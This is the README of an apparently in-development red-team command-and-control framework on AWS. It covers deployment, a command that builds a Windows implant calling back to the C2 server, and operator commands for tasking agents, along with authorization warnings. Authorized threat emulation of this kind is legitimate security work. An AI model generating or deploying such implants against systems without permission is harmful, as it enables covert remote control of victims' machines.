# :cloud: RedNimbusC2

Red Nimbus C2 is a [command and control](https://attack.mitre.org/tactics/TA0011/) framework built on AWS services including [Lambda](https://aws.amazon.com/lambda/), [S3](https://aws.amazon.com/s3/), and [CloudWatch](https://aws.amazon.com/cloudwatch/).

The purpose of this tool is to enable legitimate cybersecurity practitioners to emulate advanced cyber threats. In that way, organizations can identify weaknesses and apply corrective and/or compensating controls to improve their security posture.

![alt text](images/nimbusC2_architecture.png)

## :warning: READ THIS FIRST! :warning:

- You are solely responsible for your use of this tool.

- You are required to build it, deploy it, and operate it.

- :moneybag: :fire: **You will be charged for your use of AWS resources**.

- Before utilizing this tool, ensure you have explicit written permission to assess the target network(s) from the network owner(s).

- Additionally, you are responsible for complying with the AWS support policy for penetration testing, available [here](https://aws.amazon.com/security/penetration-testing/).

- Misuse of this tool is **strongly condemned** by the author, and will almost certaintly result in criminal and/or legal action.

## :construction: Pardon Our Dust

This repository is under active development.

Content is not expected to be stable or even usable at this time.

`[!] Do not use this tool until this notice is removed.`

## :floppy_disk: Prerequisites

### 1. Create AWS Account

Red Nimbus C2 makes exclusive use of AWS cloud services.

For this reason, you must have your own AWS account.

Instructions on creating an AWS account are provided [here](https://aws.amazon.com/premiumsupport/knowledge-center/create-and-activate-aws-account/).

### 2. Install Build Dependencies

You must install the following resources in order to build and operate Red Nimbus C2:

1. [Node.js](https://nodejs.org/en/)
2. [Python 3](https://www.python.org)
3. [Go](https://go.dev)
4. [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html)
5. [AWS CDK](https://aws.amazon.com/getting-started/guides/setup-cdk/)
6. [Make](https://www.gnu.org/software/make/)
7. [Git](https://git-scm.com)

## :computer: Installation

After installing the needed build depdencies, you can install/deploy Red Nimbus C2 using the following commands.

1. **Clone the repository**

```bash
git clone https://github.com/bluesentinelsec/RedNimbusC2.git
```

2. **Deploy Red Nimbus C2 infrastructure to AWS using [CDK](https://aws.amazon.com/cdk/)**

```bash
# enter the RedNimbusC2 directory
cd RedNimbusC2

# deploy RedNimbusC2 resources to AWS
make deploy

# optionally deploy to a specific AWS account like so:
# make deploy AWS_PROFILE=<your_profile>
```

See [here](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-profiles.html) for info on configuring AWS CLI profiles.

:exclamation: To remove the Red Nimbus C2 infrastructure on AWS:

```bash
# remove nimbusc2 binaries and AWS infrastructure
# this will destroy any operational data you may have
# in S3, so be sure to backup your data before uninstalling if necessary 
make destroy
```

3. **Install the Red Nimbus C2 Operator Client**

```bash
# from RedNimbusC2 directory
pip3 install -r nimbusc2_client/requirements.txt

python3 nimbusc2_client/nimbusc2.py --help
```

## Operator Instructions

Red Nimbus C2 uses the following workflow:

1. Generate C2 agent
2. Deploy agent to target
3. Issue commands using the Nimbus C2 operator client
4. Cleanup when finished

### 1. Generate C2 Agent

The Red Nimbus C2 agent is executed on target systems.

On execution, the agent calls back to the Red Nimbus C2 infrastructure and establishes a C2 session.

```bash
./nimbusc2-create-agent --format exe \
            --arch amd64 \
            --platform windows \
            --c2url https://aws-api-gateway-url \
            --proxy "http://userName:password123@127.0.0.1:1234" \
            --private-key "change_me_123!$" \
            --callback-schedule "cron_schedule" \
            --kill-date "date" \
            --implant-group myGroupName \
            --allow-target myIntendedTarget \
            --allow-user myTargetUser \
            --out-file nimbus_agent.exe \
            --verbose 
```

### 2. Deploy Agent to Target System(s)

You are responsible for deploying the Nimbus C2 agent to your intended target.

As a reminder, always stay in scope, always follow your rules of engagement, and always get explicit written permission to execute prior to conducting your engagement.

### Interact with Agent Sessions

```bash
# view summarized info about all sessions
nimbusc2.py --list-sessions

# view detailed agent session information
nimbusc2.py --get-session --session-id <agent_session_id>

# terminate agent session
nimbusc2.py --remove-session --session-id <agent_session_id>
```

### Issue Commands to Agents

```bash
# issue an agent task; will be executed by all agents by default
nimbusc2.py --set-task --cmd <supported_agent_command>

# view a pending agent task
nimbusc2.py --get-task --task-id <task_id>

# delete a pending agent task
nimbusc2.py --remove-task --task-id <task_id>
```

### View Task Output

TBD

### Cleanup

You can task all implants to terminate and delete by issuing this command:

```
TBD
```
